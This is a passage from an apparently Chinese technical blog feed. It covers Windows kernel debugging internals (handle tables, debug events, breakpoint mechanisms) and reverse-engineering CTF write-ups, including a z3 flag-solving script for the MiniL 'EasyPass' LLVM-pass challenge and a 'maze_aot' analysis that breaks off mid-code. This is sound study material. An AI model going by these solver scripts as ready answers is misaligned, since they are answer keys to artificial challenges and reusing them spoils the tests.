href="#全局句柄表"></a> 全局句柄表</h2><ol><li><p>进程的句柄表是私有的，每个进程都有一个自己的句柄表</p></li><li><p>除此之外，系统还有一个全局句柄表：<code>PsdCidTable</code>，为 <code>_HANDLE_TABLE</code> 结构，所有的进程和线程无论无论是否打开，都在这个表中</p></li><li><p>每个进程和线程都有一个唯一的编号：<code>PID和CID</code> 这两个值其实就是全局句柄表中的索引</p></li><li><p>进程和线程的查询,主要是以下三个函数,按照给定的PID或CID从PspCidTable从查找相应的进线程对象：</p><ul><li><p>PsLookupProcessThreadByCid()</p></li><li><p>PsLookupProcessByProcessId()</p></li><li><p>PsLookupThreadByThreadId()</p></li></ul></li></ol><h1 id="软件调试"><a class="markdownIt-Anchor" href="#软件调试"></a> 软件调试</h1><h2 id="调试相关"><a class="markdownIt-Anchor" href="#调试相关"></a> 调试相关</h2><h3 id="调试对象"><a class="markdownIt-Anchor" href="#调试对象"></a> 调试对象</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023788.png" alt="image-20231003200338832" /></p><ol><li>调试器与被调试进程通过 <code>DEBUG_OBJECT</code> 结构体建立联系</li><li><code>DEBUG_OBJECT</code> 中有一个链表成员，用于记录所有<strong>调试事件</strong></li><li>当被调试进程产生调试事件时，调试器从链表中取出调试事件进行处理</li></ol><ul><li>调试事件有不同种类，只有几个最关键的种类才会被记录到链表中，例如被调试进程进行文件读写、申请内存、释放内存等行为时不会产生调试事件，即不是所有的调试事件都会被记录到链表中</li></ul><h3 id="调试事件的采集"><a class="markdownIt-Anchor" href="#调试事件的采集"></a> 调试事件的采集</h3><ol><li>调试事件有多种，真正需要关注的只有<strong>7种</strong></li><li>Windows通过在被调试进程的<strong>必经之路</strong>上调用调试事件采集函数，向 <code>DEBUG_PORT</code> 中挂入调试事件</li><li>不同事件的必经之路所使用的调试事件采集函数不同，但最终都通过 <code>DbgkSendApiMessage</code> 向链表中写入调试事件信息(封装好的调试事件结构体)<ul><li><code>DbgkSendApiMessage</code> 有两个参数，第一个参数为调试事件类型，第二个参数为是否挂起其它线程，有时需要，比如0xCC，有时不需要，比如模块加载</li></ul></li></ol><h3 id="调试事件的处理"><a class="markdownIt-Anchor" href="#调试事件的处理"></a> 调试事件的处理</h3><ol><li>调试器在创建进程时，除了能得到进程创建、创建线程、模块加载等调试事件之外，还会收到一个<code>异常事件</code></li><li>异常来源于调试器创建进程时触发的<code>系统断点</code>，目的是给调试器一个中断的机会</li><li>调试器在附加进程时，能够得到一份<code>模拟的</code>进程创建时产生的相关调试事件信息</li><li>这些虚假的调试事件信息可靠性较低，程序在执行过程中可能已经处理过部分信息</li></ol><h3 id="异常的处理"><a class="markdownIt-Anchor" href="#异常的处理"></a> 异常的处理</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023040.png" alt="image-20231003201011971" /></p><ul><li><p>这里注意<strong>未处理异常: 最后一道防线</strong></p></li><li><p><code>UnhandledExceptionFilter</code> 执行流程：</p><ol><li><p>通过<code>NtQueryInformationProcess</code>查询当前进程是否正在被调试，如果是，返回<code>EXCEPTION_CONTINUE_SEARCH</code>，此时会进入第二轮分发</p></li><li><p>如果没有被调试：</p><ul><li>查询是否通过<code>SetUnhandledExceptionFilter</code>注册处理函数，如果有就调用</li></ul><p>如果没有通过<code>SetUnhandledExceptionFilter</code>注册处理函数，弹出窗口，让用户选择终止程序还是启动即时调试器。</p><ul><li>如果用户没有启用即时调试器，那么该函数返回<code>EXCEPTION_EXECUTE_HANDLER</code></li></ul></li></ol></li><li><p>这里若是原程序通过 <code>SetUnhandledExceptionFilter</code> 来注册处理函数的话，使用调试器不会关注这个处理，所以会导致执行结果与原程序不相符的情况发生</p></li></ul><h2 id="断点"><a class="markdownIt-Anchor" href="#断点"></a> 断点</h2><h3 id="调试的本质"><a class="markdownIt-Anchor" href="#调试的本质"></a> 调试的本质</h3><p><strong>描述</strong>：</p><ol><li>调试的本质是<strong>触发异常</strong>与<strong>调试器接管异常的过程</strong></li><li>不论是软件断点，硬件断点还是 <code>INT 3</code> 断点，本质都是触发异常</li></ol><h3 id="软件断点"><a class="markdownIt-Anchor" href="#软件断点"></a> 软件断点</h3><p><strong>描述</strong>：</p><ul><li>当使用调试器在任意代码位置设置断点时，本质上是将当前代码位置的字节码改为<strong>0xCC</strong>，对应的汇编指令为<strong>INT 3</strong>，调试器为了界面的美观，不会直接在反汇编界面将修改后的数据显示出来</li></ul><p><strong>执行流程</strong>：</p><ul><li><p>被调试进程：</p><ol><li>CPU检测到INT 3指令</li><li>查IDT表找到对应的中断处理函数</li><li>CommonDispatchException</li><li>KiDispatchException</li><li>DbgkForwardException收集并发送调试事件</li><li>最终调用<code>DbgkpSendApiMessage(x, x)</code><ul><li>第一个参数：消息类型</li><li>第二个参数：是否挂起其它线程</li></ul></li></ol></li><li><p>调试器进程：</p><ol><li>循环判断</li><li>取出调试事件</li><li>列出信息：寄存器、内存</li><li>用户处理</li></ol></li></ul><h3 id="内存断点"><a class="markdownIt-Anchor" href="#内存断点"></a> 内存断点</h3><p><strong>描述</strong>：</p><ul><li>当需要在某块内存被访问时产生中断，可以使用内存断点。</li><li>内存断点能够分为两种类型：<ul><li>内存访问：内存被读写时产生中断</li><li>内存写入：内存被写入时产生中断</li></ul></li><li>通过 <code>VirtualProtectEx</code> 来实现<ul><li>内存访问：将指定内存的属性修改为 <code>PAGE_NOACCESS</code>(修改后，PTE的P位等于0)</li><li>内存写入：将指定内存的属性修改为 <code>PAGE_EXECUTE_READ</code>(修改后，PTE的P位等于1，R/W位等于0)</li></ul></li></ul><p><strong>内存断点的执行流程</strong>：</p><ul><li><p>被调试进程：</p><ol><li>CPU访问错误的内存地址，触发页异常</li><li>查IDT表找到对应的中断处理函数(nt!_KiTrap0E)</li><li>CommonDispatchException</li><li>KiDispatchException</li><li>DbgkForwardException收集并发送调试事件</li><li>最终调用<code>DbgkpSendApiMessage(x, x)</code><ul><li>第一个参数：消息类型，共有7种类型</li><li>第二个参数：是否挂起其它线程</li></ul></li></ol></li><li><p>调试器进程：</p><ol><li>循环判断</li><li>取出调试事件</li><li>列出信息：寄存器、内存</li><li>用户处理</li></ol></li></ul><h3 id="硬件断点"><a class="markdownIt-Anchor" href="#硬件断点"></a> 硬件断点</h3><p><strong>描述</strong>：</p><ol><li>与软件断点与内存断点不同，<strong>硬件断点</strong>不依赖被调试程序，而是依赖于CPU中的<strong>调试寄存器</strong></li><li>调试寄存器有<strong>8个</strong>，分别为 <strong>Dr0~Dr7</strong></li><li>用户最多能够设置4个硬件断点，这是由于只有<strong>Dr0~Dr3</strong>用于存储线性地址</li><li>其中，Dr4和Dr5是保留的</li></ol><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023053.png" alt="image-20231003202224792" /></p><p><strong>设置硬件断点</strong>：</p><ul><li><strong>Dr0~Dr3</strong> 用于设置硬件断点，由于只有4个断点寄存器，所以最多只能设置4个硬件调试断点。</li><li><strong>Dr7</strong> 是最重要的寄存器：<ul><li><strong>L0/G0 ~ L3/G3</strong>：控制Dr0~Dr3是否有效，局部还是全局；每次异常后，Lx都被清零,Gx不清零。</li><li><strong>断点长度(LENx)</strong>：00(1字节)、01(2字节)、11(4字节)</li><li><strong>断点类型(R/Wx)</strong>：00(执行断点)、01(写入断点)、11(访问断点)</li></ul></li></ul><p><strong>触发硬件断点</strong>：</p><ul><li><p>被调试进程：</p><ol><li>CPU执行时检测当前线性地址与调试寄存器(Dr0~Dr3)中的线性地址相等</li><li>查IDT表找到对应的中断处理函数(nt!_KiTrap01)</li><li>CommonDispatchException</li><li>KiDispatchException</li><li>DbgkForwardException收集并发送调试事件</li><li>最终调用<code>DbgkpSendApiMessage(x, x)</code><ul><li>第一个参数：消息类型，共有7种类型</li><li>第二个参数：是否挂起其它线程</li></ul></li></ol></li><li><p>调试器进程：</p><ol><li>循环判断</li><li>取出调试事件</li><li>列出信息：寄存器、内存</li><li>用户处理</li></ol></li></ul><p><strong>处理硬件断点</strong>：</p><ul><li>硬件调试断点产生的异常是 <code>STATUS_SINGLE_STEP</code>(单步异常)</li><li>检测Dr6寄存器的B0~B3：判断哪个寄存器触发的异常</li></ul><h3 id="单步步入"><a class="markdownIt-Anchor" href="#单步步入"></a> 单步步入</h3><p><strong>描述</strong>：</p><ol><li><strong>单步步入</strong>的实现依赖于<strong>单步异常</strong></li><li>当我们需要观察每一行代码(包括函数内部的代码)执行之后寄存器与内存的变化，通常会采用单步步入</li><li>当使用单步步入时，可采用在下一行代码的首字节设置INT 3断点的方式实现</li><li>CPU为我们提供了一种更为方便的方法，即使用<strong>陷阱标志位(TF位)</strong></li></ol><p><strong>设置单步异常</strong></p><ul><li>将TF位置1</li></ul><p><strong>处理单步异常</strong></p><ul><li>单步产生的异常与硬件断点产生的异常一致，都是 <code>STATUS_SINGLE_STEP</code>(单步异常)</li></ul><h3 id="单步步过"><a class="markdownIt-Anchor" href="#单步步过"></a> 单步步过</h3><p><strong>描述</strong>：</p><ul><li>当遇到CALL指令时，若无需进入函数内部进行调试，可以使用单步步过。</li><li>与单步步入不同的是，单步步过的实现依赖于软件断点或硬件断点。</li></ul><p><strong>实现思路</strong>：</p><ol><li>判断当前指令是否为CALL指令</li><li>若不是CALL指令，设置TF为1触发单步异常</li><li>若是CALL指令，判断OPCODE是E8还是FF15</li><li>若<code>OPCODE</code>是E8，在当前地址之后的第5个字节设置软件断点(E8指令占5个字节)</li><li>若<code>OPCODE</code>是FF15，在当前地址之后的第6个字节设置软件断点(FF15指令占6个字节)</li></ol><ul><li>这里识别出 <code>CALL</code> 指令后，通常需要根据反汇编引擎来识别下一条指令的地址(call指令明面上的下一条)，然后在该地址设置硬件断点或者是软件断点</li></ul>]]></content>
    
    
    <categories>
      
      <category>OS相关</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一些记录2</title>
    <link href="/posts/1ea6e51b.html"/>
    <url>/posts/1ea6e51b.html</url>
    
    <content type="html"><![CDATA[<h1 id="minil"><a class="markdownIt-Anchor" href="#minil"></a> MiniL</h1><h2 id="easypass"><a class="markdownIt-Anchor" href="#easypass"></a> EasyPass</h2><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><ul><li><a href="https://dua0g.top/archives/385">llvm的讲解</a></li><li><a href="https://bbs.kanxue.com/thread-273119.htm">llvm实战分析</a></li><li>LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。总体而言，PASS就是对IR进行额外处理，通过自己编写的函数来统计信息或者插入处理，这里对于源文件没有任何影响，只是在优化的过程中产生结果罢了。</li></ul><h3 id="运行与编译"><a class="markdownIt-Anchor" href="#运行与编译"></a> 运行与编译</h3><ul><li><p>按照 <code>Usage.md</code> 所言使用 PASS 对 IR 进行优化处理</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141010620.png" alt="image-20230714101016577" /></p><p>没有什么信息，那么就通过编译 IR 为汇编文件分析</p></li><li><p>使用 <code>clang-10 -o main main.bc</code> 将LLVM bitcode 进一步编译为汇编(ELF文件)</p></li></ul><h4 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h4><ul><li><p>首先对于 <code>EasyPass。so</code> 文件进行分析，根据 LLVM PASS 的性质，找到虚表中的 <code>runOnFunction</code> 函数(通过定位虚表，找到最后一个函数即是目标函数)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141028472.png" alt="image-20230714102834441" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141028952.png" alt="image-20230714102855930" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141029342.png" alt="image-20230714102914323" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141030271.png" alt="image-20230714103011250" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141031753.png" alt="image-20230714103110707" /></p></li><li><p>分析 <code>runOnFunction</code> 函数，发现函数很大，反编译不成功，看汇编发现前面很多调用过了固定返回1的函数，则nop掉再进行反汇编分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x2673</span>,<span class="hljs-number">0x6C9B</span>):<br>    patch_byte(i,<span class="hljs-number">0x90</span>)<br></code></pre></td></tr></table></figure></li><li><p>首先是通过 <code>getName</code> 获得16个 <code>llvm::Value</code> 的类型的输入，这里根据 a2 是llvm中的 Value 对象，在llvm中 <code>Function</code> 是 Value 的⼀个⼦类，则a2 就是 LLVM 中的 <code>Function &amp;F</code> 的参数 F，即这里先通过 getName 获取函数名称，转为C语⾔字符串之后存⼊ <code>unk_41B0</code> 数组中</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141049081.png" alt="image-20230714104929056" /></p></li><li><p>之后进入一个函数进行加密处理，这里采用虚拟机形式，通过异或处理进行加密处理—分析加密函数，发现是前半截异或后半截，后半截异或0xff</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141048916.png" alt="image-20230714104824893" /></p></li><li><p>当该 FunctionPass 遍历了26个函数之后(<code>通过调试可以发现遍历的函数就是main.bc编译成ELF中主函数的26个函数</code>)开始进行密钥比较。经过26轮加密后进⾏密⽂⽐较</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141052465.png" alt="image-20230714105245439" /></p></li></ul><h4 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h4><ul><li><p>配置好 LLVM 的环境(可以使用 <code>'opt-10 -load ……'</code>进行操作)</p></li><li><p>之后需要将<code>.so</code>文件进行链接，否则找不到此动态链接库(首先使用 <code>find / -type f -name EasyPass.so 2&gt;/dev/null</code> 查找 <code>.so</code> 文件所在目录，之后使用 <code>sudo ln -s /home/re/CTF/EasyPass.so /usr/lib</code> 对动态链接库进行链接)</p></li><li><p>之后配置 IDA 进行动态调试</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307141149719.png" alt="image-20230714114944674" /></p></li></ul><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>str0 = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x4D</span>,<br>        <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>,<br>        <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x61</span>,<br>        <span class="hljs-number">0x74</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x66</span>,<br>        <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>]<br><br>text1 = [BitVec(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">124</span> - <span class="hljs-number">97</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">97</span>, <span class="hljs-number">123</span>):<br>    str0[i] = text1[i - <span class="hljs-number">97</span>]<br>str0[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>names = [<span class="hljs-string">&quot;aaCCzCzzMMaMCMa&quot;</span>,<br>         <span class="hljs-string">&quot;bbMMyMyyZZbZMZb&quot;</span>,<br>         <span class="hljs-string">&quot;ccCCxCxxJJcJCJc&quot;</span>,<br>         <span class="hljs-string">&quot;ddQQwQwwMMdMQMd&quot;</span>,<br>         <span class="hljs-string">&quot;eeYYvYvvKKeKYKe&quot;</span>,<br>         <span class="hljs-string">&quot;ffHHuHuuCCfCHCf&quot;</span>,<br>         <span class="hljs-string">&quot;ggDDtDttKKgKDKg&quot;</span>,<br>         <span class="hljs-string">&quot;hhDDsDssOOhODOh&quot;</span>,<br>         <span class="hljs-string">&quot;iiCCrCrrIIiICIi&quot;</span>,<br>         <span class="hljs-string">&quot;jjOOqOqqDDjDODj&quot;</span>,<br>         <span class="hljs-string">&quot;kkSSpSppEEkESEk&quot;</span>,<br>         <span class="hljs-string">&quot;llXXoXooTTlTXTl&quot;</span>,<br>         <span class="hljs-string">&quot;mmLLnLnnVVmVLVm&quot;</span>,<br>         <span class="hljs-string">&quot;nnII_I__HHnHIHn&quot;</span>,<br>         <span class="hljs-string">&quot;ooOO_O__CCoCOCo&quot;</span>,<br>         <span class="hljs-string">&quot;ppFF_F__NNpNFNp&quot;</span>,<br>         <span class="hljs-string">&quot;qqDD_D__BBqBDBq&quot;</span>,<br>         <span class="hljs-string">&quot;rrTT_T__BBrBTBr&quot;</span>,<br>         <span class="hljs-string">&quot;ssJJ_J__CCsCJCs&quot;</span>,<br>         <span class="hljs-string">&quot;ttGG_G__XXtXGXt&quot;</span>,<br>         <span class="hljs-string">&quot;uuDD_D__OOuODOu&quot;</span>,<br>         <span class="hljs-string">&quot;vvUU_U__JJvJUJv&quot;</span>,<br>         <span class="hljs-string">&quot;wwOO_O__SSwSOSw&quot;</span>,<br>         <span class="hljs-string">&quot;xxRR_R__SSxSRSx&quot;</span>,<br>         <span class="hljs-string">&quot;yyEE_E__KKyKEKy&quot;</span>,<br>         <span class="hljs-string">&quot;zzJJ_J__TTzTJTz&quot;</span>,<br>         ]<br><span class="hljs-keyword">for</span> str1 <span class="hljs-keyword">in</span> names:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(str1) + <span class="hljs-number">1</span>):<br>        str0[i] = <span class="hljs-built_in">ord</span>(str1[i - <span class="hljs-number">1</span>])<br>    str0[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>):<br>        v4 = str0[str0[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>]<br>        v3 = str0[str0[<span class="hljs-number">0</span>]]<br>        v2 = str0[str0[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span>]<br>        str0[<span class="hljs-number">0</span>] += <span class="hljs-number">3</span><br>        str0[v2] = (~(str0[v4] &amp; str0[v3])) &amp; <span class="hljs-number">0xff</span><br>s = Solver()<br>cipher = [<span class="hljs-number">0x64</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x00</span>,<br>          <span class="hljs-number">0x16</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA9</span>,<br>          <span class="hljs-number">0x92</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xCA</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">97</span>, <span class="hljs-number">123</span>):<br>    s.add(cipher[i - <span class="hljs-number">97</span>] == str0[i])<br><span class="hljs-built_in">print</span>(s.check())<br>m = s.model()<br><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> m.decls():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;d.name()&#125;</span> = <span class="hljs-subst">&#123;m[d]&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># final = &#123;20: 109,</span><br><span class="hljs-comment">#          18: 108,</span><br><span class="hljs-comment">#          13: 112,</span><br><span class="hljs-comment">#          17: 76,</span><br><span class="hljs-comment">#          10: 115,</span><br><span class="hljs-comment">#          21: 95,</span><br><span class="hljs-comment">#          15: 101,</span><br><span class="hljs-comment">#          23: 52,</span><br><span class="hljs-comment">#          7: 79,</span><br><span class="hljs-comment">#          5: 48,</span><br><span class="hljs-comment">#          6: 111,</span><br><span class="hljs-comment">#          8: 111,</span><br><span class="hljs-comment">#          0: 81,</span><br><span class="hljs-comment">#          2: 81,</span><br><span class="hljs-comment">#          12: 109,</span><br><span class="hljs-comment">#          3: 95,</span><br><span class="hljs-comment">#          16: 95,</span><br><span class="hljs-comment">#          14: 108,</span><br><span class="hljs-comment">#          22: 80,</span><br><span class="hljs-comment">#          9: 95,</span><br><span class="hljs-comment">#          11: 105,</span><br><span class="hljs-comment">#          1: 119,</span><br><span class="hljs-comment">#          25: 53,</span><br><span class="hljs-comment">#          19: 86,</span><br><span class="hljs-comment">#          24: 115,</span><br><span class="hljs-comment">#          4: 115,</span><br><span class="hljs-comment">#          &#125;</span><br></code></pre></td></tr></table></figure><h2 id="maze_aot"><a class="markdownIt-Anchor" href="#maze_aot"></a> maze_aot</h2><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><ul><li><p>分析文件，首先就是 <code>Input a 64-bit hex number to solve the maze:</code> ，就是以十六进制输入64位的整数，然后到了 <code>maze_walk()</code> 函数，这里都是跳转</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307152321226.png" alt="image-20230715232115144" /></p></li><li><p>之后查看其中 <code>maze_stop</code> 函数与 <code>maze_final</code> 函数，发现需要经过64个跳转(对应输入的64-bit)，这里存在着<code>steps &amp; 1</code> 和 <code>steps = steps &gt;&gt; 1</code>，即把输入转化为一串二进制数，从后往前根据末尾是否为 1 决定是否跳跃。</p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307152321978.png" alt="image-20230715232149948" /></p><ul><li>在其中一个跳转中，存在一个 <code>maze_final</code> 函数，这个函数就是最后结束的条件，到达这个函数所在的地方就是得到flag的条件</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307152322144.png" alt="image-20230715232201123" /></p><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h3><p>​这里首先需要知道该程序的控制流，</p><h3 id="法1"><a class="markdownIt-Anchor" href="#法1"></a> 法1</h3><p>​使用 IDAPython 脚本时需要知道其中函数的意义，这里弄懂<a href="%5Bhttps://zhuanlan.zhihu.com/p/21330930">基本快和控制流的概念</a>。简单而言，函数中的基本块就是以跳转分类，只有一个入口和一个出口的可供程序顺序执行的语句序列，</p><ul><li>首先使用 <code>idapython</code> 提取改题目中的数据结构</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 